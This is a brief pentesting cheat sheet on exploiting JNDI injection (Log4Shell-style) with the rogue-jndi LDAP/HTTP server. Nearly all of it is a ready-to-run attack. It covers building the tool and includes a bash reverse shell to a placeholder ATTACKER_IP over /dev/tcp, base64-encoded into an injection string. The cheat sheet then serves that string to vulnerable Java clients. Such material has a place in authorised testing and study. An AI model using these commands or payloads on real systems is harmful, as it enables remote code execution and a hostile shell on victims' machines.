# ldap for jndi attack

**Author:** Julien Bongars\
**Date:** 2025-09-25 09:05:14
**Path:**

---

Rogue LDAP + HTTP for JNDI injection (Log4Shell-style). Start locally, then force the client to resolve your LDAP URL.

```java
InitialContext.doLookup("ldap://your_server.com:1389/o=reference");
```

The client connects; the rogue server returns a payload that can execute on deserialize / lookup.

## Usage

```bash
# installation
git clone https://github.com/veracode-research/rogue-jndi ~/rogue-jndi
cd ~/rogue-jndi
mvn package

# get help
java -jar target/RogueJndi-1.0.jar -h

YOURIP="ATTACKER_IP"
COMMAND="bash -c 'bash -i >& /dev/tcp/${YOURIP}/443 0>&1'"
COMMAND_B64="$(echo "$COMMAND" | base64)"
INJECTION="bash -c {echo,${COMMAND_B64}}|{base64,-d}|{bash,-i}"

java -jar ./target/RogueJndi-1.1.jar \
  --command "$INJECTION" \
  --hostname "$YOURIP" \
  --ldapPort 1389 \
  --httpPort 8000
```

## Resources

- [veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi) — LDAP/HTTP gadget server
- [HackTricks — JNDI](https://book.hacktricks.wiki/en/pentesting-web/deserialization/java-jsf-viewstate-.html) — lookup / gadget context
